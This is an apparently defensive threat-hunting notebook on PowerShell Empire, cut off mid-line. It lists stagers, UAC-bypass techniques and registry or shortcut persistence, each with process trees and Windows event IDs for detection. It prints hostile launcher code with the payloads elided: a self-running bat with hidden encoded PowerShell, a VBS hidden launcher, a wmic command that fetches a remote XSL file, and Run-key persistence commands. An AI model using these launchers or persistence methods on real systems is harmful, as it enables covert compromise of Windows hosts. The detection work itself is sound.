# Hunting Notes - PowerShell Empire

> Paolo Coba | 04/03/2021

-------------------------------------------

## Resources
* [https://www.securitynik.com/2022/02/beginning-powershell-empire-attack-in.html](https://www.securitynik.com/2022/02/beginning-powershell-empire-attack-in.html)
* [https://www.sans.org/white-papers/38315/](https://www.sans.org/white-papers/38315/)
* [https://enigma0x3.net/2016/03/15/phishing-with-empire/](https://enigma0x3.net/2016/03/15/phishing-with-empire/)
* [https://www.hackingarticles.in/multiple-ways-to-exploiting-windows-pc-using-powershell-empire/](https://www.hackingarticles.in/multiple-ways-to-exploiting-windows-pc-using-powershell-empire/)
* [https://support.microsoft.com/en-us/topic/how-to-use-the-regsvr32-tool-and-troubleshoot-regsvr32-error-messages-a98d960a-7392-e6fe-d90a-3f4e0cb543e5](https://support.microsoft.com/en-us/topic/how-to-use-the-regsvr32-tool-and-troubleshoot-regsvr32-error-messages-a98d960a-7392-e6fe-d90a-3f4e0cb543e5)

## Overview

## Characteristics

## Experiments

### Stagers

* `windows/launcher_bat`: creates bat file with base64 encoded PowerShell. 
    * Process tree on target:
    ```cmd
    cmd.exe (C:\Windows\system32\cmd.exe /c "<launcher.bat>")-> powershell.exe ("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -nol -nop -ep bypass "[IO.File]::ReadAllText('C:\Users\IEUser\launcher.bat')|iex")-> powershell.exe (powershell -noP -sta -w 1 -enc <base64>)
    ```
    * Generated stager code (not obfuscated)
    ```bat
    # 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText('%~f0')|iex" & DEL "%~f0" & POPD /B
    powershell -noP -sta -w 1 -enc <BASE64>
    ```
    * Detection
        * `Windows Powershell.evtx`:
            * Event ID 400 - Engine state is changed from None to Available: HostApplication will contain base64 encoded PowerShell
            * Event ID 600 - Provider Lifecycle:
                * Will contain powershell IEX that executes content in bat script.
                * Will contain stager powershell base64 encoded code.
        * `Microsoft-Windows-PowerShell%4Operational.evtx`
            * Event ID 4100 - Executing Pipeline: HostApplication contains base64 encoded PowerShell
            * Event ID 4104 - Execute a Remote Command: Contains full PowerShell stager code.
* `windows/launcher_vbs`:
    * Process tree on target: `wscript.exe` creates and starts standalone `powershell.exe` process running stager code.
    ```cmd
    powershell.exe ("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc <base64>) -> conhost.exe
    ```
    * Generated stager code (not obfuscated)
    ```vbs
    Dim objShell
    Set objShell = WScript.CreateObject("WScript.Shell")
    command = "powershell -noP -sta -w 1 -enc  <base64>"
    objShell.Run command,0
    Set objShell = Nothing
    ```
    * Detection:
        * Same as above
* `windows/launcher_sct`: Uses with `regsvr32.exe` to register OLE object.
    * MITRE: [https://attack.mitre.org/techniques/T1218/010/](https://attack.mitre.org/techniques/T1218/010/)
    * [https://support.microsoft.com/en-us/topic/how-to-use-the-regsvr32-tool-and-troubleshoot-regsvr32-error-messages-a98d960a-7392-e6fe-d90a-3f4e0cb543e5](https://support.microsoft.com/en-us/topic/how-to-use-the-regsvr32-tool-and-troubleshoot-regsvr32-error-messages-a98d960a-7392-e6fe-d90a-3f4e0cb543e5)
    * Process Tree: `powershell.exe` containing agent runs as standalone process.
    ```cmd
    regsvr32.exe -> powershell.exe
    ```
    * Detection:
        * Security EVTX:
            * Event ID 4688 - Process Creation: look for `powershell.exe` with parent as `regsvr32.exe`
        * PowerShell Event Logs same as before
        * Check launch arguments of `regsvr32.exe`
* `windows/wmic`: Uses `wmic` to exploit the use of `XSL` files
    * Launch
    ```cmd
    wmic os get /format:"<server>/<xsl file>"
    ```
    * Process Tree: `powershell.exe` containing agent runs as a standalone process.
    ```cmd
    wmic.exe -> powershell.exe
    ```
    * Detection:
        * Security EVTX:
            * Event ID 4688 - Process Creation: `powershell.exe` with parent `wmic.exe`
            * Event ID 4688 - Process Creation: `wmic.exe`, check launch arguments which will contain xsl file.
        * PowerShell Event Logs
        * 

### Privilege Escalation
* `powershell/privesc/bypassuac_env`: Bypasses UAC by modifying environmental variables in Registry.
    * Resource:
        * [https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html](https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html)
    * Process Tree
    ```cmd
    svchost.exe (No arguments) -> powershell.exe (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -w Hidden -enc $x; Start-Sleep -Seconds 1\system32\cleanmgr.exe /autoclean /d C:) -> powershell.exe (powershell.exe -NoP -NonI -w Hidden -enc <base64>)
    ```
    * Exploits task `SilentCleanup`: 
        * Modifies `%windir%` environmental variable (`HKCU\Environment\windir`) to contain powershell code for execution.
        * Modifies `HKCU\Software\Microsoft\Windows\Update` to contain base64 stager code.
        * Runs with elevated privileges
* `powershell/privesc/bypassuac_eventvwr`:
    * [https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
* `powershell/privesc/bypassuac_fodhelper_progids`
    * [https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)
    * Writes Registry keys used by `fodhelper.exe`
        * `HKCU\Software\Classes\ms-settings\CurVer\(Default)`: cotains pointer to registry key with malicious code.
        * `HKCU\Software\Classes\.pwn\Shell\Open\command\(Default)`: contains command to execute
    * Process Tree:
    ```cmd
    powershell.exe (existing agent) -> fodhelper.exe -> powershell.exe (new agent)
    ```
    * Detection:
        * Security EVTX:
            * Event ID 4688 - Process Creation: creation of `fodhelper.exe` process with no arguments from `powershell.exe`
            * Event ID 4688 - Process Creation: creation of `powershell.exe` process from `fodhelper.exe`
            * Event ID 4688 - Process Creation: termination of `fodhelper.exe`
        * PowerShell Event logs same as before
* `powershell/privesc/bypassuac_wscript`
    * [https://rstforums.com/forum/topic/97349-uac-bypass-vulnerability-in-windows-script-host/](https://rstforums.com/forum/topic/97349-uac-bypass-vulnerability-in-windows-script-host/)
* `powershell/privesc/bypassuac_tokenmanipulation`: TBD
* `powershell/privesc/bypassuac_sdctlbypass`:
    * [https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/](https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/)

### Persistence
* `powershell/persistence/userland/registry`: Establishes persistence in Registry. Modified Keys
    * `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater`: sets value as `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x`
    * `HKCU\Software\Microsoft\Windows\CurrentVersion\Debug`: sets base64 encoded stager logic. This is called by the script in the Updater key.
* `powershell/persistence/userland/backdoor_lnk`: Establishes persistence through specified `lnk` file.
    * Specified `lnk`: Detection through `LECmd` (Zimmerman tools). Executes base64 content that starts process with PowerShell code from the specified registry key
    ```powershell
    powershell  -w hidden -nop -enc <base64>
    
    Base64 decodes to
    [System.Diagnostics.Process]::Start("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp <registry key>).debug)))
    ```
    * Backdoor code contained in the specified registry key. Default is `HKCU\Software\Microsoft\Windows\debug
